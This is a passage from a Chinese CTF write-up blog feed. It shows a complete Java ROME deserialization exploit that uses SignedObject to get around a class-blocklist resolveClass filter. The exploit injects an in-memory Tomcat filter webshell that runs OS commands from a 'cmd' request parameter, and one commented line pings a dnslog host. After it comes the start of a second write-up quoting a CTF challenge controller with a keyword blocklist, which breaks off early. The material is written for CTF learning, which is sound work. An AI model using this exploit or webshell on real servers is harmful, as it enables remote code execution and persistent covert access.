<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">        <span class="built_in">this</span>.list.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.list.add(ObjectBean.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.list.add(ToStringBean.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.list.add(TemplatesImpl.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.list.add(Runtime.class.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.list.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据提示，推测是<strong>Rome</strong>反序列化，二次反序列化绕过<strong>resolveClass</strong>，打了一下发现不出网，找了个内存马缝了一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getPayload</span><span class="params">(Class clazz, Object payloadObj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, payloadObj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, payloadObj);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;beanClass&quot;</span>, clazz);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;obj&quot;</span>, payloadObj);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(TomcatInject.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;ping ocdpeh.dnslog.cn\&quot;);&quot;;</span></span><br><span class="line">        <span class="comment">//        cc.makeClassInitializer().insertBefore(cmd);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table1</span> <span class="operator">=</span> getPayload(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table2</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(table2);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TomcatInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">                <span class="keyword">if</span> (servletContext != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">ctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                    ctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) ctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(appctx);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (standardContext != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 这样设置不会抛出报错</span></span><br><span class="line">                        <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span></span><br><span class="line">                                org.apache.catalina.util.LifecycleBase.class.getDeclaredField(</span><br><span class="line">                                        <span class="string">&quot;state&quot;</span>);</span><br><span class="line">                        stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Filter</span> <span class="variable">myFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TomcatInject</span>();</span><br><span class="line">                        <span class="comment">// 调用 doFilter 来动态添加我们的 Filter</span></span><br><span class="line">                        <span class="comment">// 这里也可以利用反射来添加我们的 Filter</span></span><br><span class="line">                        javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span></span><br><span class="line">                                servletContext.addFilter(filterName, myFilter);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 进行一些简单的设置</span></span><br><span class="line">                        filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                        filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// 设置基本的 url pattern</span></span><br><span class="line">                        filterRegistration.addMappingForUrlPatterns(</span><br><span class="line">                                java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),</span><br><span class="line">                                <span class="literal">false</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 将服务重新修改回来，不然的话服务会无法正常进行</span></span><br><span class="line">                        <span class="keyword">if</span> (stateField != <span class="literal">null</span>) &#123;</span><br><span class="line">                            stateField.set(</span><br><span class="line">                                    standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 在设置之后我们需要 调用 filterstart</span></span><br><span class="line">                        <span class="keyword">if</span> (standardContext != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="comment">// 设置filter之后调用 filterstart 来启动我们的 filter</span></span><br><span class="line">                            <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span></span><br><span class="line">                                    StandardContext.class.getDeclaredMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                            filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/** 将我们的 filtermap 插入到最前面 */</span></span><br><span class="line">                            <span class="type">Class</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc =</span><br><span class="line">                                        Class.forName(</span><br><span class="line">                                                <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (ccc == <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    ccc = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 把filter插到第一位</span></span><br><span class="line">                            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span></span><br><span class="line">                                    Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span><br><span class="line">                                            .getDeclaredMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">                            Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                            Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[filterMaps.length];</span><br><span class="line">                            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                                m = ccc.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) m.invoke(o);</span><br><span class="line">                                <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                    tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                                filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// webshell命令参数名</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ServletContext <span class="title function_">getServletContext</span><span class="params">()</span></span><br><span class="line">                <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// shell注入，前提需要能拿到request、response等</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 不为空则意味着第一次反序列化的准备工作已成功</span></span><br><span class="line">            <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">                servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果不能去到request，则换一种方式尝试获取</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// spring获取法1</span></span><br><span class="line">            <span class="keyword">if</span> (servletRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    c =</span><br><span class="line">                            Class.forName(</span><br><span class="line">                                    <span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">                    c =</span><br><span class="line">                            Class.forName(</span><br><span class="line">                                    <span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">                    m = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">                    servletRequest = (ServletRequest) m.invoke(o);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>) <span class="keyword">return</span> servletRequest.getServletContext();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// spring获取法2</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.ContextLoader&quot;</span>);</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getCurrentWebApplicationContext&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.WebApplicationContext&quot;</span>);</span><br><span class="line">                m = c.getMethod(<span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> (ServletContext) m.invoke(o);</span><br><span class="line">                <span class="keyword">return</span> servletContext;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span><br><span class="line">                <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">                <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">                ServletRequest servletRequest,</span></span><br><span class="line"><span class="params">                ServletResponse servletResponse,</span></span><br><span class="line"><span class="params">                FilterChain filterChain)</span></span><br><span class="line">                <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(</span><br><span class="line">                    <span class="string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a href="http://wjlshare.com/archives/1541"><strong>Tomcat</strong>
内存马学习(二)：结合反序列化注入内存马 – 天下大木头</a></p>
<p><a
href="https://longlone.top/安全/java/java反序列化/反序列化篇之ROME/">反序列化篇之<strong>ROME</strong>
- <strong>Longlone's Blog</strong></a></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 中国研究生网络安全创新大赛 线上预选赛 部分题解</title>
    <url>/2022-CPIPC-Preliminary/</url>
    <content><![CDATA[<p>没有网络的网络安全大赛。</p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="babyql">BabyQL</h2>
<p>给了源码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.web.ql.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ql.util.express.DefaultContext;</span><br><span class="line"><span class="keyword">import</span> com.ql.util.express.ExpressRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">/* loaded from: BabyQL.jar:BOOT-INF/classes/com/ctf/web/ql/controller/AppController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome :)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/exp&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exp</span><span class="params">(<span class="meta">@RequestBody</span> Map params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">x</span> <span class="operator">=</span> params.get(<span class="string">&quot;x&quot;</span>).toString();</span><br><span class="line">        <span class="keyword">if</span> (x.hashCode() != <span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>.hashCode() || x.equals(<span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> params.get(<span class="string">&quot;cmd&quot;</span>).toString();</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;process|runtime|javascript|\\+|char|\\\\|from|\\[|\\]|load&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (pattern.matcher(cmd).find()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ExpressRunner</span> <span class="variable">runner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressRunner</span>();</span><br><span class="line">        DefaultContext&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">DefaultContext</span>&lt;&gt;();</span><br><span class="line">        runner.execute(cmd, context, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码爆破<strong>hashCode</strong>。</p>
